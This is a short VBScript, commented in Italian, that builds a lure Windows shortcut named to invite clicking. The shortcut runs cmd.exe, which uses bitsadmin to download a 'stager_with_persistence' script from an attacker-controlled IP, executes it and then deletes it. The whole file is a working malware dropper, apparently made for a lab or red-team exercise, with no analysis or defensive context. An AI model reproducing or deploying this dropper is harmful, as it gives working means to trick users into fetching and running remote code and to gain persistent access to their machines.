'Lanciare dal terminale con: cscript create_dropper_lnk.vbs

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "clickmeSeTifiNapoliSempre.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\cmd.exe"
oLink.Arguments = "/c bitsadmin /transfer mystager /priority FOREGROUND http://192.168.18.129/stager_with_persistence.cmd  C:\Users\Public\Libraries\stager_with_persistence.cmd & call C:\Users\Public\Libraries\stager_with_persistence.cmd & del C:\Users\Public\Libraries\stager_with_persistence.cmd"
oLink.Save

